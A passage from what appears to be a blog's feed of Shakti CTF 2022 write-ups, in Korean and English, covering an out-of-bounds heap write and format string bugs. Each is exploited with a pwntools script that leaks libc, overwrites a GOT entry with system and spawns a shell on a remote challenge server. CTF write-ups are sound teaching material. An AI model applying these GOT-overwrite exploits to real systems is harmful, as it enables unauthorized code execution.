/usr/lib64/ld-linux-x86-64.so.2 (0x00007f8d6e69d000)</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3fd000)</span><br></pre></td></tr></table></figure><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">=======================</span><br><span class="line"> | Welcome Phrack 66 |</span><br><span class="line">=======================</span><br><span class="line"></span><br><span class="line">Here&#x27;s a generous leak for you! 0x7fc34a06dba0</span><br><span class="line"></span><br><span class="line">Here&#x27;s one more generous leak for you: 0x961220</span><br><span class="line"></span><br><span class="line">MENU</span><br><span class="line"></span><br><span class="line">1. malloc 0/4</span><br><span class="line">2. edit</span><br><span class="line">3. target</span><br><span class="line">4. quit</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>ÏõêÌïòÎäî ÏÇ¨Ïù¥Ï¶àÎßåÌÅº ÌûôÏóê Îç∞Ïù¥ÌÑ∞Î•º Ìï†Îãπ Í∞ÄÎä•ÌïòÍ≥†.. ÏõêÌïòÎäî Ïù∏Îç±Ïä§(?)Ïóê ÎÇ¥Ïö©ÏùÑ ÏàòÏ†ï Í∞ÄÎä•ÌïòÎã§.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter index: &quot;</span>);</span><br><span class="line">  v5 = getint(<span class="number">8LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No negative indices allowed!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt; <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;maximum requests reached!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !m_array[v5] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Index not allocated!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;data: &quot;</span>);</span><br><span class="line">  get_inp(m_array[v5], (<span class="type">unsigned</span> <span class="type">int</span>)(size + <span class="number">10</span>));</span><br></pre></td></tr></table></figure><p>Ïù∏Îç±Ïä§Î•º ÏûÖÎ†•Î∞õÏßÄÎßå Ï†ïÏûë Í≤ÄÏ¶ùÌïòÎäî Ïù∏Îç±Ïä§Îäî ÏóâÎö±Ìïú Í∞íÏù¥ÎùºÏÑú oobÍ∞Ä Î∞úÏÉùÌïúÎã§. </p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><p>Ï∂úÎ†•Ìï¥Ï£ºÎäî Í∞íÏùÑ ÌÜµÌï¥ Î¶ΩÏãú Î≤†Ïù¥Ïä§Îûë Ìûô Ï£ºÏÜåÎ•º ÏûêÏó∞Ïä§ÎüΩÍ≤å Ïïå Ïàò ÏûàÎã§.<br>1Î≤à Î©îÎâ¥Î•º Ïù¥Ïö©ÌïòÏó¨ ÌûôÏùÑ Ìï†ÎãπÌïú Îã§Ïùå malloc gotÎ•º Ï†ÅÏñ¥ÎÜìÍ≥† oobÍ∞Ä Î∞úÏÉùÌïòÎãà malloc gotÍ∞Ä Ïç®ÏßÑ Ï£ºÏÜåÏóê Ï†ëÍ∑ºÌï¥ÏÑú 2Î≤à Î©îÎâ¥Î•º Ïù¥Ïö©ÌïòÏó¨ malloc gotÎ•º system Ï£ºÏÜåÎ°ú ÎçÆÏùÑ Ïàò ÏûàÎã§.<br>Í∑∏Î¶¨Í≥† Îã§Ïãú 1Î≤à Î©îÎâ¥Î•º Ïù¥Ïö©ÌïòÎ©¥ systemÏúºÎ°ú ÎçÆÌòÄÏßÑ mallocÏù¥ Ïã§ÌñâÎê†ÌÖêÎç∞ Ïù¥Îïå Ïù∏ÏûêÎ•º Ïö∞Î¶¨Ïùò ÏûÖÎ†•Í∞íÏúºÎ°ú Ï°∞Ï†àÌï† Ïàò ÏûàÎã§. &#x2F;bin&#x2F;shÎ•º Î≥¥ÎÇ¥Ï£ºÎ©¥ ÏÑ±Í≥µ.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;65.2.136.80&#x27;</span>, <span class="number">30930</span>)</span><br><span class="line">libc = e.libc</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">info(<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">libc.address = leak - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">heap = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>)</span><br><span class="line">info(<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line">heap = heap + <span class="number">0x10e0</span></span><br><span class="line">idx = (heap-<span class="number">0x4040c0</span>)//<span class="number">8</span></span><br><span class="line"><span class="built_in">print</span>(idx)</span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc , malloc_got</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, <span class="built_in">str</span>(<span class="number">10</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>, p64(<span class="number">0x404048</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc_got -&gt; system</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendafter(<span class="string">&#x27;data:&#x27;</span>, p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">binsh = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, <span class="built_in">str</span>(binsh))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="tmi"><a href="#tmi" class="headerlink" title="tmi"></a>tmi</h2><p>ÎÑàÎ¨¥ Îä¶Í≤å Î°∏ÏóÖÏùÑ ÏûëÏÑ±ÌïúÎã§ „Öé.. Í∞úÏù∏Ï†ÅÏúºÎ°ú Î¨∏Ï†ú ÏΩîÎìúÏóê mallocÏù¥ ÎÇòÏò§Î©¥ Í∏¥Ïû•ÌïòÎäî Ìé∏Ïù∏Îç∞ Î∞îÎ°ú Ï∑®ÏïΩÏ†êÏùÑ Ï∞æÍ≥† ÏÉùÍ∞ÅÎ≥¥Îã§ Îπ†Î•¥Í≤å ÏùµÏä§ÌñàÎçò Í∏∞ÏñµÏù¥ ÎÇúÎã§.</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Shakti </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oob </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shakti CTF 2022 - game_of_thrones (medium)</title>
      <link href="/221214-shaktictf2022-game_of_thrones/"/>
      <url>/221214-shaktictf2022-game_of_thrones/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(10&#x2F;387) solves</p><p>MediumT</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>Help capture king‚Äôs landing and defeat the night walkers and his army of the dead!<br>Note: The server is running on Ubuntu 20.04.<br>Author: d1g174l_f0rtr355</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">‚îú‚îÄ‚îÄ chall_dd0d7c74-c5fb-41f8-850f-2f82d6b6495c</span><br><span class="line">‚îî‚îÄ‚îÄ libc.so.6</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chall_dd0d7c74-c5fb-41f8-850f-2f82d6b6495c: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /glibc/2.27/64/lib/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=d246cab5927d94da0823f90a45d0373f433066ab, not stripped</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">  initialize(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n\n=================================================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;|\tWelcome to Game of Thrones (GOT)\t|&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;=================================================\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;The goal is simple! You need to become the ruler of the seven kingdoms!&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      v3 = getchar();</span><br><span class="line">      getchar();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="string">&#x27;3&#x27;</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      white_walkers(&amp;num_men, &amp;num_dragons);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="string">&#x27;3&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_10:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice!&quot;</span>);</span><br><span class="line">      exit_function(<span class="number">0LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="string">&#x27;1&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      num_dragons = use_dragons();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="string">&#x27;2&#x27;</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">      kings_landing(&amp;num_men, &amp;num_dragons);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The main function has a 3 functions to keep an eye on.</p><ol><li>num_dragons &#x3D; use_dragons();</li><li>kings_landing(&amp;num_men, &amp;num_dragons);</li><li>white_walkers(&amp;num_men, &amp;num_dragons);</li></ol><p>Let‚Äôs take a look at each one.</p><h4 id="1-use-dragons"><a href="#1-use-dragons" class="headerlink" title="1. use_dragons()"></a>1. <code>use_dragons()</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">use_dragons</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> format[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\nYou currently have %d number of dragons.\n&quot;</span>, <span class="number">3LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nSay something in Valyrian: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%10s&quot;</span>, format);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The dragons say: &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(format);                               <span class="comment">// fsb</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">3LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In this function, format variable receives 10 characters from player and outputs them as they are. Since <code>printf()</code> doesn‚Äôt specify a format string when printing, the <strong>Format String Bug(FSB)</strong> possibility exists.</p><p>The return value 3 is stored in <code>num_dragons</code> that global variable.</p><h4 id="2-kings-landing-amp-num-men-amp-num-dragons"><a href="#2-kings-landing-amp-num-men-amp-num-dragons" class="headerlink" title="2. kings_landing(&amp;num_men, &amp;num_dragons)"></a>2. <code>kings_landing(&amp;num_men, &amp;num_dragons)</code></h4><p>In this funciton, the main parts of the functon are as follows.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( choice == <span class="string">&#x27;2&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *num_dragons &amp;&amp; *num_dragons &lt;= <span class="number">3u</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;How many dragons would you like to use ?\n&gt; &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;use_dragons);</span><br><span class="line">      <span class="keyword">if</span> ( use_dragons &amp;&amp; use_dragons &lt;= <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        *num_dragons -= use_dragons;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%u dragon(s) have been used!\nAre you going to kill the white walkers ?\n&gt; &quot;</span>, use_dragons);</span><br><span class="line">        getchar();</span><br><span class="line">        __isoc99_scanf(<span class="string">&quot;%50[^\n]s&quot;</span>, format);</span><br><span class="line">        <span class="built_in">printf</span>(format);                         <span class="comment">// fsb</span></span><br><span class="line">      &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You only use dragons that you have&quot;</span>);</span><br><span class="line">        exit_function(<span class="number">0LL</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>We can use the 3 dragons. It means we have the <strong>3 chances with FSB</strong> in this function. However, the <code>use_dragons()</code> must precede this function.</p><h4 id="3-white-walkers-amp-num-men-amp-num-dragons"><a href="#3-white-walkers-amp-num-men-amp-num-dragons" class="headerlink" title="3. white_walkers(&amp;num_men, &amp;num_dragons)"></a>3. <code>white_walkers(&amp;num_men, &amp;num_dragons)</code></h4><p>There is no meaningful code to find vulnerablilties.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p>In <code>use_dragons()</code> function, There is 1 FSB.<br>In <code>kings_landing()</code> function, There are 3 chances with FSB.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>The exploit progressed relatively quickly in the local environment, but took a long time in the remote envireonment. I guess it‚Äôs because of libc version.</p><p>(It may be my mistake that I downloaded the wrong libc from CTF web site..)</p><p>Even though libc was given, this version doesn‚Äôt seem to match from remote environment, so I guessed the offset. Except for the offset, the exploit is same as in the local environment. <strong>So the offest is dirty because it was obtained by guessing.</strong></p><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><p>We have to leak the base address of the binary and libc using <strong>FSB that in <code>use_dragons()</code></strong>. After getting the bases, we know the address of ‚Äòprintf()‚Äô in binary and <code>system()</code> in libc. So we can overwriting <code>system()</code> to <code>printf@got</code>. In this case, it uses <strong>the FSB triggered by the <code>kings_landing()</code></strong>. </p><p>I use the <code>fmtstr_payload</code> in pwntools for comfortable. The FSB payload has a 50 length limit, so I use the <code>write_size</code> argument and only 4 bytes of the <code>system()</code> for overwriting.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = fmtstr_payload(<span class="number">10</span>, &#123;e.got[<span class="string">&#x27;printf&#x27;</span>] : p64(system)[:<span class="number">4</span>] &#125;, write_size = <span class="string">&#x27;short&#x27;</span>)</span><br></pre></td></tr></table></figure><p>After overwriting, When the <code>printf()</code> is executed, the <code>system()</code> will be executed. We need to focus on the <code>printf()</code> that has only one argument. That argument is our input. It means that we have to find <code>pirntf(input);</code> same as <code>system(input);</code>. </p><p>It is not implemented in the exploit code, but after interactive we can execute the <code>use_dragons()</code> and sent the <code>sh</code> string to the part that receives the input values.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">use_dragons</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> format[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%10s&quot;</span>, format);</span><br><span class="line">  <span class="built_in">printf</span>(format); <span class="comment">// system(format);</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">3LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>You may be wondering if it‚Äôs okay to pass invalid arguments to the <code>system()</code>. For example as below.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// printf(&quot;\n\nYou currently have %d number of dragons.\n&quot;, 3LL);</span></span><br><span class="line">system(<span class="string">&quot;\n\nYou currently have %d number of dragons.\n&quot;</span>, <span class="number">3LL</span>);</span><br></pre></td></tr></table></figure><p>It just prints an error saying it can‚Äôt run but the binary isn‚Äôt exit.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh: line 1: ff: command not found</span><br></pre></td></tr></table></figure><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = e.libc</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;65.2.136.80&#x27;</span>, <span class="number">32261</span>)</span><br><span class="line">    <span class="comment"># p = process(&#x27;./chall&#x27;)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">use_dragons</span>(<span class="params">fmt</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;an:&#x27;</span>, fmt)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">kings_landing</span>(<span class="params">use, fmt</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;ns\n\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(use))</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, fmt)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">white_walkers</span>():</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak</span></span><br><span class="line">    use_dragons(<span class="string">&#x27;%17$p%39$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">    leak = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">    libc.address = leak-<span class="number">0x80</span>-<span class="number">0x23800</span>-<span class="number">0x800</span>-<span class="number">3</span></span><br><span class="line">    <span class="comment"># libc.address = leak - 0x851f0</span></span><br><span class="line">    info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">    e.address = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x1140</span></span><br><span class="line">    info(<span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># printf got -&gt; system</span></span><br><span class="line">    system = libc.address + <span class="number">0x55410</span>+<span class="number">0x100</span>-<span class="number">0x3180</span>-<span class="number">0x100</span></span><br><span class="line">    payload = fmtstr_payload(<span class="number">10</span>, &#123;e.got[<span class="string">&#x27;printf&#x27;</span>] : p64(system)[:<span class="number">4</span>] &#125;, write_size = <span class="string">&#x27;short&#x27;</span>)</span><br><span class="line">    <span class="comment"># if len(payload) &gt; 50:</span></span><br><span class="line">        <span class="comment"># p.close()</span></span><br><span class="line">        <span class="comment"># continue</span></span><br><span class="line">    <span class="comment"># print(len(payload))</span></span><br><span class="line">    kings_landing(<span class="number">1</span> ,payload)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span 